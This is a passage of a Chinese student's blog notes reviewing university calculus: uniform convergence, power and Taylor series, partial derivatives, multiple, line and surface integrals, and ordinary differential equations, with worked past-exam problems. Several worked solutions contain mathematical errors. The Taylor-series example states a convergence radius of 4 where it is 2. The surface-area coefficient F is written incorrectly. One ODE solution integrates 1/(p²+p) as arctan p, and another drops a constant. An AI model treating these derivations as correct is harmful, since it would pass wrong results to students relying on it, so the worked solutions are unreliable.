${a_n(x)}$ 对 $n$ 单调，且函数序列 ${a_n(x)}$ 在 $X$ 上一致收敛于 $0$<br>（2）函数项级数 $\\sum\\limits_{n=1}^\\infty b_n(x)$ 的部分和序列 ${B_n(x)}$ 在 $X$ 上一致有界<br>则 $\\sum\\limits_{n=1}^\\infty a_n(x)b_n(x)$ 在 $X$ 上一致收敛。</p>\n<p><strong>阿贝尔判别法</strong> 与数项级数的阿贝尔判别法类似。<br>（1）在 $X$ 中任意取定一个 $x$ ，数列 ${a_n(x)}$ 单调，又函数序列 ${a_n(x)}$ 在 $X$ 上一致有界<br>（2）级数 $\\sum\\limits_{n=1}^\\infty b_n(x)$ 在 $X$ 上一致收敛<br>则级数 $\\sum\\limits_{n=1}^\\infty a_n(x)b_n(x)$ 在 $X$ 上一致收敛。</p>\n<h5 id=\"4-3-一致收敛级数的性质\"><a href=\"#4-3-一致收敛级数的性质\" class=\"headerlink\" title=\"4.3 一致收敛级数的性质\"></a>4.3 一致收敛级数的性质</h5><p><strong>和函数的连续性</strong> 设函数项级数 $\\sum\\limits_{n=1}^\\infty u_n(x)$ 在 $[a,b]$ 上一致收敛，且其每一项 $u_n(x)$ 在 $[a,b]$ 上都连续，则其和函数 $S(x)=\\sum\\limits_{n=1}^\\infty u_n(x)$ 在 $[a,b]$ 上也连续。</p>\n<p><strong>例</strong>（2021-2022第二学期期末，11）考虑函数项级数 $\\sum\\limits_{n=2}^{\\infty}\\frac{1}{n^2\\sqrt x}$ ，证明：<br>（1）级数在 $(0,1)$ 上收敛<br>（2）级数在 $(0,1)$ 上不一致收敛<br>（3）级数的和函数 $S(x)$ 在 $(0,1)$ 上连续<br><strong>解</strong> （1）就是数项级数，随便证。<br>（2）存在点列 $x_n=\\frac{1}{n^4}\\in(0,1)(n=1,2,\\cdots)$ 使 $u_n(x_n)=1$</p>\n<h4 id=\"5-幂级数\"><a href=\"#5-幂级数\" class=\"headerlink\" title=\"5. 幂级数\"></a>5. 幂级数</h4><p>幂级数是<strong>函数项级数的一种</strong>，长这样：<br>$$<br>a_0+a_1(x-x_0)+a_2(x-x_0)^2+\\cdots+a_n(x-x_0)^n+\\cdots<br>$$</p>\n<h5 id=\"5-1-幂级数的收敛半径\"><a href=\"#5-1-幂级数的收敛半径\" class=\"headerlink\" title=\"5.1 幂级数的收敛半径\"></a>5.1 幂级数的收敛半径</h5><p>$$<br>\\lim_{n\\rightarrow\\infty}\\left|\\frac{a_{n+1}}{a_{n}}\\right|=l<br>$$<br>那么级数 $\\sum\\limits^n_{n=0}a_nx^n$ 的<strong>收敛半径</strong> $R=1/l$ ，当然直接反着除直接出也行。<br><strong>收敛区间</strong>就是 $(-R,R)$ ，<strong>收敛域</strong>就根据端点的收敛情况再修正下区间闭不闭合。</p>\n<p><strong>例</strong>（2021-2022第二学期期末，8）求幂级数 $\\sum\\limits^\\infty_{n=0}\\frac{1}{n+1}x^n$ 的收敛半径与和函数。<br><strong>解</strong><br>$$<br>\\lim_{n\\rightarrow\\infty}\\left|\\frac{a_n}{a_{n+1}}\\right|=\\lim_{n\\rightarrow\\infty}\\left|\\frac{n}{n+1}\\right|=1<br>$$<br>故收敛半径 $R=1$ ，收敛区间 $(-1,1)$ 。<br>然后讨论两个端点，当 $x=1$ 时，原级数发散；当 $x=-1$ 时，原级数收敛，故收敛域为 $[-1,1)$<br>设和函数 $S(x)=\\sum\\limits^\\infty_{n=0}\\frac{1}{n+1}x^n$ ，则两边乘 $x$ 有 $xS(x)=\\sum\\limits^\\infty_{n=0}\\frac{1}{n+1}x^{n+1}$ ，两边求导有<br>$$<br>\\left[xS(x)\\right]’=\\sum\\limits^\\infty_{n=0}x^n=\\frac{1}{1-x}<br>$$<br>再两边求积，有<br>$$<br>xS(x)=\\int^x_0\\frac{1}{1-x}\\mathrm{d}x=-\\ln(1-x),\\ x\\in[-1,1)<br>$$<br>故当 $x\\ne0$ 时，$S(x)=-\\frac{1}{x}\\ln(1-x)$ ；当 $x=0$ 时，肉眼可见 $S(x)=1$ 。</p>\n<blockquote>\n<p>这里有个小 trick ，就是<strong>幂级数里认定 $0^0=1$</strong> ，至于为什么是这样，网上众说纷纭，读者可自行查阅。</p>\n</blockquote>\n<h5 id=\"5-2-幂级数的性质\"><a href=\"#5-2-幂级数的性质\" class=\"headerlink\" title=\"5.2 幂级数的性质\"></a>5.2 幂级数的性质</h5><p>和函数项级数一样，可以逐项求积，也可以逐项求导。</p>\n<h4 id=\"6-泰勒级数\"><a href=\"#6-泰勒级数\" class=\"headerlink\" title=\"6. 泰勒级数\"></a>6. 泰勒级数</h4><p>求函数在 $x=k$ 处的泰勒展开式就作 $t=x-k$ 变换，然后求出来的式子再代回去就行了。</p>\n<p>记一下常用的几条泰勒展开式：<br>$$<br>\\frac{1}{1-x}=1+x+x^2+x^3+\\cdots+x^n+\\cdots,\\ x\\in(-1,1)\\\\<br>e^x=1+x+\\frac{x^2}{2!}+\\frac{x^3}{3!}+\\cdots+\\frac{x^n}{n!}+\\cdots\\\\<br>\\sin x=x-\\frac{x^3}{3!}+\\frac{x^5}{5!}-\\frac{x^7}{7!}+\\cdots+(-1)^{n-1}\\frac{x^{2n-1}}{(2n-1)!}+\\cdots\\\\<br>\\cos x=1-\\frac{x^2}{2!}+\\frac{x^4}{4!}-\\frac{x^6}{6!}+\\cdots+(-1)^{n}\\frac{x^{2n}}{(2n)!}+\\cdots\\\\<br>\\arctan x=x-\\frac{x^3}{3}+\\frac{x^5}{5}-\\frac{x^7}{7}+\\cdots+(-1)^{n}\\frac{x^{2n+1}}{(2n+1)}+\\cdots\\\\<br>\\ln(1+x)=x-\\frac{x^2}{2}+\\frac{x^3}{3}-\\frac{x^4}{4}+\\cdots+(-1)^{n-1}\\frac{x^n}{n}+\\cdots\\\\<br>(1+x)^\\alpha=1+\\alpha x+\\frac{\\alpha(\\alpha-1)}{2!}x^2+\\frac{\\alpha(\\alpha-1)(\\alpha-2)}{3!}x^3+\\cdots+\\frac{\\alpha(\\alpha-1)(\\alpha-2)\\cdots(\\alpha-n+1)}{n!}x^n+R_n(x)<br>$$<br>关于最后这个 $R_n(x)$ ，一堆证明后得出，当 $x\\in (-1,1)$ 时有 $\\lim\\limits_{n\\rightarrow \\infty}=0$</p>\n<p><strong>例</strong>（2021-2022第二学期期末，10）求函数 $y=\\frac{x}{4+x^2}$ 在 $x=0$ 处的泰勒级数，并指出其收敛域。<br><strong>解</strong> $y=\\frac{x}{4}\\cdot\\frac{1}{1+(\\frac{x}{2})^2}$，右边显然就是 $\\arctan x$ 导数的形式了，故我们由 $\\arctan x$ 的泰勒展开式逐项求导有<br>$$<br>\\frac{1}{1+x^2}=(\\arctan x)’=1-x^2+x^4-x^6+\\cdots+(-1)^{n}x^{2n}+\\cdots<br>$$<br>变形得<br>$$<br>\\frac{1}{1+(\\frac{x}{2})^2}=1-\\frac{x^2}{4}+\\frac{x^4}{16}-\\frac{x^6}{64}+\\cdots+(-1)^{n}\\frac{x^{2n}}{2^{2n}}+\\cdots<br>$$<br>最后代入 $y=\\frac{x}{4}\\cdot\\frac{1}{1+(\\frac{x}{2})^2}$，有<br>$$<br>y=\\frac{x}{4}-\\frac{x^3}{16}+\\frac{x^5}{64}-\\frac{x^7}{256}+\\cdots+(-1)^n\\frac{x^{2n+1}}{2^{2n+2}}+\\cdots<br>$$<br>那么级数形式为<br>$$<br>y=\\sum\\limits^\\infty_{n=0}\\frac{(-1)^n}{4^{n+1}}x^{2n+1}<br>$$<br>收敛半径 $R=\\lim\\limits_{n\\rightarrow\\infty}\\left|\\frac{(-1)^{n}}{4^{n+1}}\\cdot\\frac{4^{n+2}}{(-1)^{n+1}}\\right|=4$<br>故收敛区间为 $(-4,4)$ ，当 $x=-4$ 时，</p>\n","excerpt":"<p>挂科了，还是要学好高数啊！</p>","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>玩脱了，光顾着搞技术，绩点炸了。<br>高数 59 ，有人问我说我是不是得罪老师了——但是有没有一种可能，就是。。平时分已经给满了（）</p>\n<h2 id=\"笔记正文\"><a href=\"#笔记正文\" class=\"headerlink\" title=\"笔记正文\"></a>笔记正文</h2><h3 id=\"第六章-多元函数微分学\"><a href=\"#第六章-多元函数微分学\" class=\"headerlink\" title=\"第六章 多元函数微分学\"></a>第六章 多元函数微分学</h3><h4 id=\"1-多元函数\"><a href=\"#1-多元函数\" class=\"headerlink\" title=\"1. 多元函数\"></a>1. 多元函数</h4><h4 id=\"2-多元函数的极限\"><a href=\"#2-多元函数的极限\" class=\"headerlink\" title=\"2. 多元函数的极限\"></a>2. 多元函数的极限</h4><h4 id=\"3-多元函数的连续性\"><a href=\"#3-多元函数的连续性\" class=\"headerlink\" title=\"3. 多元函数的连续性\"></a>3. 多元函数的连续性</h4><h4 id=\"4-偏导数与全微分\"><a href=\"#4-偏导数与全微分\" class=\"headerlink\" title=\"4. 偏导数与全微分\"></a>4. 偏导数与全微分</h4><p><strong>例</strong>（2020-2021第二学期期末，1）确定实数 $\\alpha$ 的范围，使函数 $f(x,y)=\\left\\{<br>\\begin{aligned}<br>    (x^2+y^2)^\\alpha\\sin\\frac{1}{x^2+y^2},x^2+y^2\\neq0 \\\\<br>    0,x^2+y^2\\neq0<br>\\end{aligned}<br>\\right.$ 在 $(0,0)$ 处可微。<br><strong>解</strong><br>$$<br>\\lim_{x\\rightarrow0}\\frac{f(x,0)-f(0,0)}{x-0}=\\lim_{x\\rightarrow0}\\frac{x^{2\\alpha}\\sin\\frac{1}{x^2}}{x}=\\lim_{x\\rightarrow0}x^{2\\alpha-1}\\sin\\frac{1}{x^2}<br>$$<br>当 $2\\alpha-1&gt;0$ 时，极限为 $0$ ，即 $f_x’(0,0)=0$ ，此时类似地，有 $f_y’(0,0)=0$</p>\n<h4 id=\"5-复合函数与隐函数的微分法\"><a href=\"#5-复合函数与隐函数的微分法\" class=\"headerlink\" title=\"5. 复合函数与隐函数的微分法\"></a>5. 复合函数与隐函数的微分法</h4><h4 id=\"6-方向导数与梯度\"><a href=\"#6-方向导数与梯度\" class=\"headerlink\" title=\"6. 方向导数与梯度\"></a>6. 方向导数与梯度</h4><h4 id=\"7-多元函数的微分中值定理与泰勒公式\"><a href=\"#7-多元函数的微分中值定理与泰勒公式\" class=\"headerlink\" title=\"7. 多元函数的微分中值定理与泰勒公式\"></a>7. 多元函数的微分中值定理与泰勒公式</h4><h4 id=\"8-隐函数存在定理\"><a href=\"#8-隐函数存在定理\" class=\"headerlink\" title=\"8. 隐函数存在定理\"></a>8. 隐函数存在定理</h4><h4 id=\"9-极值问题\"><a href=\"#9-极值问题\" class=\"headerlink\" title=\"9. 极值问题\"></a>9. 极值问题</h4><p>先用 $f_x’=f_y’=0$ 求出稳定点，再令 $A=f_{xx},B=f_{xy},C=f_{yy}$ ，仅 $B^2 &lt; AC$ 时可以确定极值，此时 $A&gt;0$ 就是极小值， $A &lt; 0$ 就是极大值。与二元函数类似。</p>\n<p><strong>例</strong>（2021-2022第二学期期末，4）求多元函数 $f(x,y)=xe^{-\\frac{x^2+y^2}{2}}$ 的极值。<br><strong>解</strong> $f_x’=e^{-\\frac{x^2+y^2}{2}}(1-x^2),f_y’=e^{-\\frac{x^2+y^2}{2}}(-xy)$ ，令 $f_x’=f_y’=0$ ，得到 $(-1,0)$ 和 $(1,0)$ 两个稳定点。令 $A=f_{xx}=e^{-\\frac{x^2+y^2}{2}}(x^3-3x),B=f_{xy}=e^{-\\frac{x^2+y^2}{2}}(-y+x^2y),C=f_{yy}=e^{-\\frac{x^2+y^2}{2}}(-x+xy^2)$ ，代入 $(1,0)$ 得到 $A=-2e^{-\\frac{1}{2}}&lt;0$，$B=0$</p>\n<h3 id=\"第七章-重积分\"><a href=\"#第七章-重积分\" class=\"headerlink\" title=\"第七章 重积分\"></a>第七章 重积分</h3><h4 id=\"1-二重积分的概念与性质\"><a href=\"#1-二重积分的概念与性质\" class=\"headerlink\" title=\"1. 二重积分的概念与性质\"></a>1. 二重积分的概念与性质</h4><h4 id=\"2-二重积分的计算\"><a href=\"#2-二重积分的计算\" class=\"headerlink\" title=\"2. 二重积分的计算\"></a>2. 二重积分的计算</h4><p><strong>例</strong>（2021-2022第二学期期末，2）求 $I=\\int_0^1\\mathrm{d}x\\int_0^{\\sqrt{1-x^2}}(x^2+y^2)\\mathrm{d}y$<br><strong>解</strong> 作极坐标变换 $x=r\\cos\\theta,y=r\\sin\\theta$，则<br>$$<br>I = \\int_0^{\\frac{\\pi}{4}}\\mathrm{d}\\theta\\int_0^1 r\\cdot r\\mathrm{d}r = \\frac{\\pi}{12}<br>$$<br><strong>例</strong>（2017-2018第二学期期末，1）计算二重积分 $\\iint_D\\frac{|y|}{x^2+y^2}\\mathrm{d}x\\mathrm{d}y$，其中 $D$ 为圆环区域 $1\\leq x^2+y^2\\leq 4$。<br><strong>解</strong> 作极坐标变换，有<br>$$<br>I = \\int_0^{2\\pi}\\mathrm{d}\\theta\\int_1^2 \\frac{|r\\sin\\theta|}{r^2}\\cdot\\mathrm{d}r = \\int_0^{2\\pi}|\\sin\\theta|\\mathrm{d}\\theta\\int_1^2\\mathrm{d}r = 4\\int_0^{\\frac{\\pi}{2}}\\sin\\theta \\mathrm{d}\\theta\\int_1^2\\mathrm{d}r = 4<br>$$</p>\n<h4 id=\"3-三重积分的概念与计算\"><a href=\"#3-三重积分的概念与计算\" class=\"headerlink\" title=\"3. 三重积分的概念与计算\"></a>3. 三重积分的概念与计算</h4><h4 id=\"4-重积分的应用举例\"><a href=\"#4-重积分的应用举例\" class=\"headerlink\" title=\"4. 重积分的应用举例\"></a>4. 重积分的应用举例</h4><p>曲面 $S$ 由参数方程 $x=x(u,v),y=y(u,v),z=z(u,v), (u,v)\\in D’$ 给出时，可计算<br>$$<br>E = x_u^2+y_u^2+z_u^2 \\\\<br>F = x_ux_v+y_ux_v+z_ux_v \\\\<br>G = x_v^2+y_v^2+z_v^2<br>$$<br>从而<br>$$<br>S = \\iint\\limits_{D’}\\sqrt{EG-F^2}\\mathrm{d}u\\mathrm{d}v<br>$$</p>\n<h3 id=\"第八章-曲线积分与曲面积分\"><a href=\"#第八章-曲线积分与曲面积分\" class=\"headerlink\" title=\"第八章 曲线积分与曲面积分\"></a>第八章 曲线积分与曲面积分</h3><h4 id=\"1-第一型曲线积分（对弧长的曲线积分）\"><a href=\"#1-第一型曲线积分（对弧长的曲线积分）\" class=\"headerlink\" title=\"1. 第一型曲线积分（对弧长的曲线积分）\"></a>1. 第一型曲线积分（对弧长的曲线积分）</h4><p>这个非常地简单直观，就是求一条曲线（如二次函数的某一段）的长度。<br>平面曲线求法：<br>$$<br>\\int_Lf(x,y)ds=\\int_\\alpha^\\beta f[x(t),y(t)]\\sqrt{[x’(t)]^2+[y’(t)]^2}dt \\\\<br>or \\int_Lf(x,y)ds=\\int_\\alpha^\\beta f[x,y(x)]\\sqrt{[1+[y’(x)]^2}dxdy<br>$$<br>空间曲线类似：<br>$$<br>\\int_Lf(x,y,z)ds=\\int_\\alpha^\\beta f[x(t),y(t),z(t)]\\sqrt{[x’(t)]^2+[y’(t)]^2+[z’(t)]^2}dt \\\\<br>$$</p>\n<h4 id=\"2-第二型曲线积分（对坐标的曲线积分）\"><a href=\"#2-第二型曲线积分（对坐标的曲线积分）\" class=\"headerlink\" title=\"2. 第二型曲线积分（对坐标的曲线积分）\"></a>2. 第二型曲线积分（对坐标的曲线积分）</h4><p>这个看起来就不那么地直观，其物理背景是求变力在曲线上做功，大概想象一下子。<br>计算方法：<br>$$<br>\\int_{\\overset{\\frown}{AB}}P(x,y)dx=\\int_\\alpha^\\beta P[x(t),y(t)]x’(t)dt \\\\<br>\\int_{\\overset{\\frown}{AB}}Q(x,y)dy=\\int_\\alpha^\\beta Q[x(t),y(t)]y’(t)dt<br>$$<br>两类曲线积分关系：<br>$$<br>\\int_LPdx+Qdy=\\int_L(Pcos\\alpha +Qcos\\beta )ds \\\\<br>or \\int_\\Gamma Pdx+Qdy+Rdz=\\int_L(Pcos\\alpha +Qcos\\beta +Rcos\\gamma )ds<br>$$</p>\n<h4 id=\"3-格林公式\"><a href=\"#3-格林公式\" class=\"headerlink\" title=\"3. 格林公式\"></a>3. 格林公式</h4><p>就一道式子：<br>$$<br>∮_L Pdx+Qdy=∬\\limits_D( \\frac{ \\partial Q }{ \\partial x }- \\frac{ \\partial P }{ \\partial y })dxdy\\\\<br>$$<br>条件是函数 $P$ 和 $Q$ 在平面区域 $D$ 上有连续的偏导数 <del>，这个条件一般不管，</del> 主要是<strong>边界曲线 $L$ 闭合</strong>就行。<br>格林公式可以将<strong>第二类曲线积分</strong>化为简单的二重积分，非常地不错。</p>\n<blockquote>\n<p>PS:以下这些符号的 Latex 支持不是很好，直接用字符了。<br>$$<br>∮ \\ ∯ \\ ∰ \\ ∱ \\ ∲ \\ ∳<br>$$</p>\n</blockquote>\n<p><strong>例</strong>（2020-2021第二学期期末，2）计算曲线积分 $∮_L(xy^2-\\sin y)\\mathrm{d}y-(\\cos x+x^2y)\\mathrm{d}x$ ，其中 $L$ 为圆周 $x^2+y^2=4$ ，积分方向为沿 $L$ 逆时针方向。<br><strong>解</strong> $L$ 为闭合曲线，且 $P,Q$ 在 $L$ 围成的 $D$ 上偏导也连续，所以可以用格林公式：<br>$$<br>\\begin{aligned}<br>I&amp;=\\iint\\limits_D[y^2-(-x^2)]\\mathrm{d}x\\mathrm{d}y \\\\<br>&amp;=\\int_0^{2\\pi}\\mathrm{d}\\theta\\int_0^2r^2\\cdot r\\mathrm{d}r \\\\<br>&amp;=8\\pi<br>\\end{aligned}<br>$$</p>\n<h4 id=\"4-第一型曲面积分\"><a href=\"#4-第一型曲面积分\" class=\"headerlink\" title=\"4. 第一型曲面积分\"></a>4. 第一型曲面积分</h4><p>和第一型曲线积分一样直观，就是求一个曲面的面积。<br>计算方法：<br>$$<br>\\iint \\limits_{\\Sigma} f(x,y,z) \\mathrm{d}S=\\iint \\limits_{D_{xy}}f[x,y,z(x,y)]\\sqrt{1+(\\frac{\\partial z}{\\partial x})^2+(\\frac{\\partial z}{\\partial y})^2}\\mathrm{d}x\\mathrm{d}y<br>$$</p>\n<h4 id=\"5-第二型曲面积分\"><a href=\"#5-第二型曲面积分\" class=\"headerlink\" title=\"5. 第二型曲面积分\"></a>5. 第二型曲面积分</h4><p>计算方法：<br>$$<br>\\iint \\limits_{\\Sigma} R(x,y,z) \\mathrm{d}S=\\iint \\limits_{D_{xy}}R[x,y,z(x,y)]\\mathrm{d}x\\mathrm{d}y<br>$$</p>\n<p>两类曲面积分关系：<br>$$<br>\\iint \\limits_\\Sigma P\\mathrm{d}y\\mathrm{d}z+Q\\mathrm{d}x\\mathrm{d}z+R\\mathrm{d}x\\mathrm{d}y=\\iint \\limits_\\Sigma(Pcos\\alpha+Qcos\\beta+Rcos\\gamma)\\mathrm{d}S<br>$$</p>\n<h4 id=\"6-高斯公式与斯托克斯公式\"><a href=\"#6-高斯公式与斯托克斯公式\" class=\"headerlink\" title=\"6. 高斯公式与斯托克斯公式\"></a>6. 高斯公式与斯托克斯公式</h4><p><strong>高斯公式</strong>：<br>$$<br>∯ \\limits_\\Sigma P\\mathrm{d}y\\mathrm{d}z+Q\\mathrm{d}x\\mathrm{d}z+R\\mathrm{d}x\\mathrm{d}y=\\iiint \\limits_\\Omega(\\frac{\\partial P}{\\partial x}+\\frac{\\partial Q}{\\partial y}+\\frac{\\partial R}{\\partial z})\\mathrm{d}x\\mathrm{d}y\\mathrm{d}z \\\\<br>or ∯ \\limits_\\Sigma(P\\mathrm{cos}\\alpha+Q\\mathrm{cos}\\beta+R\\mathrm{cos}\\gamma)\\mathrm{d}S=\\iiint \\limits_\\Omega(\\frac{\\partial P}{\\partial x}+\\frac{\\partial Q}{\\partial y}+\\frac{\\partial R}{\\partial z})\\mathrm{d}x\\mathrm{d}y\\mathrm{d}z<br>$$<br><strong>例</strong>（2021-2022第二学期期末，3）计算曲面积分 $∯ \\limits_\\Sigma(x-z)\\mathrm{d}y\\mathrm{d}z+z\\mathrm{d}x\\mathrm{d}y$ ，其中 $\\Sigma$ 是由 $z=x^2+2y^2$ 与 $z=1$ 所围成立体表面的外侧。<br><strong>解</strong> $\\Sigma$ 是封闭曲面，直接上高斯公式，有<br>$$<br>I=\\iiint \\limits_\\Omega(1+1)\\mathrm{d}x\\mathrm{d}y\\mathrm{d}z=2\\iiint \\limits_\\Omega\\mathrm{d}V<br>$$<br>作柱面坐标变换 $x=r\\cos\\theta,y=\\frac{r\\sin\\theta}{\\sqrt2}$ ，得<br>$$<br>I=\\int_0^{2\\pi}\\mathrm{d}\\theta\\int_0^1\\mathrm{d}r\\int_0^1\\frac{r}{\\sqrt{2}}dz=\\frac{\\pi}{\\sqrt2}<br>$$</p>\n<blockquote>\n<p>直角坐标与柱面坐标关系：<br>$$<br>\\left\\{<br>\\begin{aligned}<br>x&amp;=r\\cos\\theta \\\\<br>y&amp;=r\\sin\\theta \\\\<br>z&amp;=z<br>\\end{aligned}<br>\\right.<br>$$<br>此时 $\\mathrm{d}V=r\\mathrm{d}r\\mathrm{d}\\theta\\mathrm{d}z$<br>直角坐标与球面坐标关系：<br>$$<br>\\left\\{<br>\\begin{aligned}<br>x&amp;=r\\sin\\varphi\\cos\\theta \\\\<br>y&amp;=r\\sin\\varphi\\sin\\theta \\\\<br>z&amp;=r\\cos\\varphi<br>\\end{aligned}<br>\\right.<br>$$<br>此时 $\\mathrm{d}V=r^2\\sin\\varphi\\mathrm{d}r\\mathrm{d}\\theta\\mathrm{d}\\varphi$</p>\n</blockquote>\n<p><strong>斯托克斯公式</strong>：<br>$$<br>∮_L P\\mathrm{d}x+Q\\mathrm{d}y+R\\mathrm{d}z=\\iint \\limits_\\Sigma<br>\\begin{vmatrix}<br>\\mathrm{d}y\\mathrm{d}z &amp; \\mathrm{d}x\\mathrm{d}z &amp; \\mathrm{d}x\\mathrm{d}y \\\\<br>\\frac{\\partial}{\\partial x} &amp; \\frac{\\partial}{\\partial y} &amp; \\frac{\\partial}{\\partial z} \\\\<br>P &amp; Q &amp; R<br>\\end{vmatrix}=<br>\\iint \\limits_\\Sigma<br>\\begin{vmatrix}<br>\\mathrm{cos}\\alpha &amp; \\mathrm{cos}\\beta &amp; \\mathrm{cos}\\gamma \\\\<br>\\frac{\\partial}{\\partial x} &amp; \\frac{\\partial}{\\partial y} &amp; \\frac{\\partial}{\\partial z} \\\\<br>P &amp; Q &amp; R<br>\\end{vmatrix}<br>\\mathrm{d}S<br>$$</p>\n<h3 id=\"第九章-常微分方程\"><a href=\"#第九章-常微分方程\" class=\"headerlink\" title=\"第九章 常微分方程\"></a>第九章 常微分方程</h3><h4 id=\"1-基本概念\"><a href=\"#1-基本概念\" class=\"headerlink\" title=\"1. 基本概念\"></a>1. 基本概念</h4><p>所谓常微分方程，就是区别于偏微分方程，未知函数是<strong>一元函数</strong>，而不是多元。<br>常微分方程的阶数即肉眼可见的导数的最高阶，如 $y’’’+2(y’’)^3+y^2+x^5$ 就是三阶常微分方程。<br><strong>通解</strong>的概念：$n$ 阶常微分方程有解 $y=\\varphi(x;C_1,\\cdots,C_n)$ ，其中 $C_1,\\cdots,C_n$ 是 $n$ 个独立的任意常数，则称其为方程的一个通解；相对的，就有特解的概念，即方程的任何一个不包含任意常数的解。用数学语言表达独立性，有雅可比行列式不为零，即<br>$$<br>\\frac{D(\\varphi,\\varphi’,\\cdots,\\varphi^{n-1})}{D(C_1,C_2,\\cdots,C_n)}\\ne0<br>$$</p>\n<p>举个例子，经典方程 $y’’+y=0$ 有解 $y=C_1\\mathrm{sin}x+C_2\\mathrm{cos}x$ ，则雅可比行列式为<br>$$<br>\\frac{D(y,y’)}{D(C_1,C_2)}=<br>\\begin{vmatrix}<br>\\mathrm{sin}x &amp; \\mathrm{cos}x \\\\<br>\\mathrm{cos}x &amp; -\\mathrm{sin}x<br>\\end{vmatrix}<br>=-1 \\ne 0<br>$$<br>可能你会问这个雅可比行列式具体怎么出來的，其实第一行就是 $y$ 分别对 $C_1$ 和 $C_2$ 求导，第二行是 $y’$ 对 $C_1$ 和 $C_2$ 求导。<br>故 $C_1,C_2$ 是两个独立的任意常数，进而 $y=C_1\\mathrm{sin}x+C_2\\mathrm{cos}x$ 是方程的通解。</p>\n<h4 id=\"2-初等积分法\"><a href=\"#2-初等积分法\" class=\"headerlink\" title=\"2. 初等积分法\"></a>2. 初等积分法</h4><h5 id=\"2-1-变量分离的方程\"><a href=\"#2-1-变量分离的方程\" class=\"headerlink\" title=\"2.1 变量分离的方程\"></a>2.1 变量分离的方程</h5><h5 id=\"2-2-可化为变量分离的几类方程\"><a href=\"#2-2-可化为变量分离的几类方程\" class=\"headerlink\" title=\"2.2 可化为变量分离的几类方程\"></a>2.2 可化为变量分离的几类方程</h5><h5 id=\"2-3-一阶线性微分方程\"><a href=\"#2-3-一阶线性微分方程\" class=\"headerlink\" title=\"2.3 一阶线性微分方程\"></a>2.3 一阶线性微分方程</h5><p>形如<br>$$<br>\\frac{\\mathrm{d}y}{\\mathrm{d}x}+P(x)y=Q(x)<br>$$<br>的一阶微分方程就叫一阶线性微分方程。<br>一般套公式就行，若 $Q(x)\\equiv0$ ，则为齐次方程，直接积分有通解 $y=C\\mathrm{e}^{-\\int P(x)\\mathrm{d}x}$ ；若为非齐次方程则用<strong>常数变易法</strong>求得通解<br>$$<br>y=\\mathrm{e}^{-\\int P(x)\\mathrm{d}x}\\left[\\int Q(x)\\mathrm{e}^{\\int P(x)\\mathrm{d}x}dx+C\\right]<br>$$<br>然后还有<strong>贝努里方程</strong>（当然贝努利方程也是它，音译嘛）长这样：<br>$$<br>\\frac{\\mathrm{d}y}{\\mathrm{d}x}+P(x)y=Q(x)y^n\\ (n\\ne0,1)<br>$$<br>作变量代换 $z=y^{1-n}$ ，可化为一阶线性方程<br>$$<br>\\frac{\\mathrm{d}z}{\\mathrm{d}x}+(1-n)P(x)z=(1-n)Q(x)<br>$$</p>\n<h5 id=\"2-4-全微分方程与积分因子\"><a href=\"#2-4-全微分方程与积分因子\" class=\"headerlink\" title=\"2.4 全微分方程与积分因子\"></a>2.4 全微分方程与积分因子</h5><p><strong>例</strong>（2021-2022第二学期期末，4）求微分方程 $x\\mathrm{d}y+(y+x^2)\\mathrm{d}x=0$ 的通解。<br><strong>解</strong> $\\frac{\\partial P}{\\partial y}=1=\\frac{\\partial Q}{\\partial x}$，且它们在全平面上连续，故方程为全微分方程。下求原函数 $u(x,y)$ ，由 $\\frac{\\partial u}{\\partial x}=P(x,y)=y+x^2$ ，对 $x$ 积分得<br>$$<br>u(x,y)=xy+\\frac{x^3}{3}+\\varphi(y)<br>$$<br>上式对 $y$ 求偏导得<br>$$<br>\\frac{\\partial u}{\\partial y}=x+\\varphi’(y)<br>$$<br>另一方面，<br>$$<br>\\frac{\\partial u}{\\partial y}=Q(x,y)=x<br>$$<br>比较上两式得 $\\varphi’(y)=0$ ，因而 $\\varphi(y)=0$（这里省略积分常数，不影响后面的通积分表达式），故原函数为 $u(x,y)=xy+\\frac{x^3}{3}$ ，故方程的通解为<br>$$<br>xy+\\frac{x^3}{3}=C<br>$$<br>其中 $C$ 为任意常数。</p>\n<blockquote>\n<p>微分方程的通解也叫通积分</p>\n</blockquote>\n<h5 id=\"2-5-可降阶的二阶微分方程\"><a href=\"#2-5-可降阶的二阶微分方程\" class=\"headerlink\" title=\"2.5 可降阶的二阶微分方程\"></a>2.5 可降阶的二阶微分方程</h5><p><strong>例</strong>（2021-2022第二学期期末，5）求微分方程 $y’’=y’\\cdot y$ 的通解。<br><strong>解</strong> 方程中不显含变量 $x$ ，令 $p=y’$ ，并将 $y$ 看作自变量，有 $y’’=p\\frac{\\mathrm{d}p}{\\mathrm{d}y}$ ，代入有<br>$$<br>p\\frac{\\mathrm{d}p}{\\mathrm{d}y}=p\\cdot y<br>$$<br>若 $p=y’=0$ ，则通解为 $y=C$ ，若 $p\\ne0$ ，则有<br>$$<br>\\begin{aligned}<br>\\frac{\\mathrm{d}p}{\\mathrm{d}y}&amp;=y \\\\<br>\\int\\mathrm{d}p&amp;=\\int y\\mathrm{d}y \\\\<br>p&amp;=\\frac{1}{2}y^2+C_1<br>\\end{aligned}<br>$$<br>即 $\\frac{\\mathrm{d}y}{\\mathrm{d}x}=\\frac{1}{2}y^2+C_1$ ，再次分离分量，有<br>$$<br>\\begin{aligned}<br>\\frac{\\mathrm{d}y}{\\mathrm{d}x}&amp;=\\frac{1}{2}y^2+C_1 \\\\<br>\\int\\frac{2}{y^2}\\mathrm{d}y&amp;=\\int\\mathrm{d}x + C_2 \\\\<br>-\\frac{2}{y}&amp;=x+C_3 \\\\<br>y&amp;=-\\frac{2}{x}+C<br>\\end{aligned}<br>$$</p>\n<blockquote>\n<p>这里面的常量 $C$ 变得我也很迷糊，但是结果代进去是对的，就先这样吧（）</p>\n</blockquote>\n<p><strong>例</strong>（2020-2021第二学期期末，5）求微分方程 $\\frac{\\mathrm{d}^2y}{\\mathrm{d}x^2}=(\\frac{\\mathrm{d}y}{\\mathrm{d}x})^3+\\frac{\\mathrm{d}y}{\\mathrm{d}x}$ 的通解。<br><strong>解</strong> 令 $p=y’$ ，有 $y’’=p\\frac{\\mathrm{d}p}{\\mathrm{d}y}$ ，代入有<br>$$<br>p\\frac{\\mathrm{d}p}{\\mathrm{d}y}=(p^3+p) \\\\<br>\\frac{1}{p^2+p}\\mathrm{d}p=\\mathrm{d}y \\\\<br>\\arctan p=y+C_1<br>$$<br>即有 $\\frac{\\mathrm{d}y}{\\mathrm{d}x}=p=\\tan(y+C_1)$ 